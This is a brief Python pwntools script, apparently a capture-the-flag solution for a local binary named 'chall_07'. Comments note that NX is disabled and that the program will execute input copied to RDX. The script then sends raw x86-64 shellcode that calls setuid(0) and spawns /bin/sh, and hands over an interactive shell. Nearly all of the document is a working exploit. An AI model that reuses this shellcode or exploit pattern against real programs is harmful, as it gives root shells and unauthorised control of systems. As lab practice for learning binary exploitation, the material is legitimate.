'''
Flaws: NX disabled, symbols
Security: full RELRO, PIE enabled --no ROP without leak.
'''

from pwn import *

p = process("./chall_07")
p.sendline(b"Something")
'''
Put shellcode directly into payload which will copy it to RDX and will be executed.
'''
payload = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
p.sendline(payload)
p.interactive()